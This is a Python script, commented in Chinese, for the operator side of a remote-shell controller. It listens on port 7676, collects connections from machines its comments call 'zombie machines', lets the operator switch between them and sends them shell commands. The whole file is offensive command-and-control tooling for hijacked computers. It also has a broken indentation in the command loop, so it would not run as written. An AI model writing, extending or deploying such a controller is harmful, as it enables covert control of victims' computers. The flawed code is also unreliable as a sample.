#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading

clientList = []             #连接的客户端列表
curClient = None            #当前的客户端
quitThread = False          #是否退出线程
lock = threading.Lock()

def shell_ctrl(socket,addr):                #负责发送Shell命令和接收结果
	while True:
	com = input(str(addr[0]) + ':~#')   #等待输入命令
	if com == '!ch':                    #切换肉机命令
		select_client()
		return
	if com == '!q':                     #退出控制端命令
		exit(0)
	socket.send(com.encode('utf-8'))    #发送命令的字节码
	data = socket.recv(1024)            #接收反回的结果
	print(data.decode('utf-8'))         #输出结果


def select_client():
    global clientList
    global curClient
    print('--------------* The current is connected to the client: *----------------')
    for i in range(len(clientList)):    #输出已经连接到控制端的肉机地址
        print('[%i]-> %s' % (i, str(clientList[i][1][0])))
    print('Please select a client!')

    while True:
        num = input('client num:')      #等待输入一个待选择地址的序号
        if int(num) >= len(clientList):
            print('Please input a correct num!')
            continue
        else:
            break

    curClient = clientList[int(num)]     #将选择的socket对象存入curClient中

    print('=' * 80)
    print(' ' * 20 + 'Client Shell from addr:', curClient[1][0])
    print('=' * 80)

def wait_connect(sk):
    global clientList
    while not quitThread:
        if len(clientList) == 0:
            print('Waiting for the connection......')
        sock, addr = sk.accept()
        print('New client %s is connection!' % (addr[0]))
        lock.acquire()
        clientList.append((sock, addr))
        lock.release()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',7676))
    s.listen(1024)

    t = threading.Thread(target=wait_connect,args=(s,))
    t.start()

    while True:
        if len(clientList) > 0:
            select_client()  # 选择一个客户端
            shell_ctrl(curClient[0],curClient[1]) #处理shell命令

if __name__ == '__main__':
    main()